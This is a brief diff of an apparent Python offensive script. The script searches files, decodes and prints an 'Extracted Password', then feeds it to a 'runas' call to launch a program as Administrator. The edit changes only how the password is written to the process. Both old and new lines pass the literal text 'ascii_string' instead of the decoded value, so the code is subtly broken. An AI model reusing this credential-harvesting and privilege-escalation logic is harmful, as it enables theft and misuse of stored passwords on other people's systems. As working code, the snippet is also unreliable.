@@ -61,7 +61,7 @@ def find_files(targets, base_dir=""):
                         print(f'[+] Extracted Password: {ascii_string}')
                         
                         prog = sp.Popen(['runas', '/noprofile', '/user:Administrator', 'NeedsAdminPrivilege.exe'],stdin=sp.PIPE)
-                        prog.stdin.write('ascii_string')
+                        prog.stdin.write(b'ascii_string\n')
                         prog.communicate()
                     except Exception as decode_error:
                         # Fallback if the data is already plain text or not valid base64
